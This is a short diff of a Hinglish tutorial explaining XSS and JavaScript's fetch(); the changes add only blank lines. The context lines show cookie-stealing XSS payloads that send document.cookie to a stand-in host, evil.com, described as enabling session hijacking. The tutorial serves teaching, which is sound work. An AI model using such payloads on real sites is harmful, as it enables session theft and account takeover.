@@ -48,6 +48,7 @@ alert(c); // tumhari current session ki cookies dikha dega**
 **fetch("https://evil.com/steal?cookie=" + document.cookie);**
 
 ### 🕵️‍♂️ Matlab: Victim ki session cookie attacker ko chali jaayegi = session hijack
+
 ---
 
 **fetch()** — (Data dusri jagah bhejna)
@@ -63,6 +64,7 @@ fetch() ka kaam hota hai HTTP request bhejna JavaScript se.
 ### XSS exploit:
 
 **fetch("https://evil.com/log?cookie=" + document.cookie);**
+
 ---
 
 ### Quick Summary
